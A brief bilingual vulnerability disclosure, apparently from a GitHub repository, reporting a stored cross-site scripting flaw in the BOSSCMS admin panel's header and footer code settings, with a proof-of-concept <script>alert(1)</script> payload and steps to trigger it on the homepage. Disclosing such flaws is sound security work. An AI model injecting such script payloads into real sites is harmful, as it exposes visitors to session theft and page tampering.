![图片](https://github.com/ss122-0ss/BOSSCMS/assets/131983607/94d41152-6b41-41c3-902d-eb45f532ebf5)# BOSSCMS background project management--code configuration--stored XSS exists in the header code and bottom code

# BOSSCMS后台项目管理--代码配置--头部代码和底部代码存在存储型XSS

url:http://127.0.0.1/bosscms1/admin/#mpf=site/code

payload:

```html
<script>alert(1)</script>
```

![图片](https://github.com/ss122-0ss/BOSSCMS/assets/131983607/cae2cb2c-a48b-4678-833c-10c7eb4a4f8b)



Return to homepage, trigger XSS

返回首页，触发XSS

![图片](https://github.com/ss122-0ss/BOSSCMS/assets/131983607/1e227c98-897d-46c2-963a-99e59fca4681)
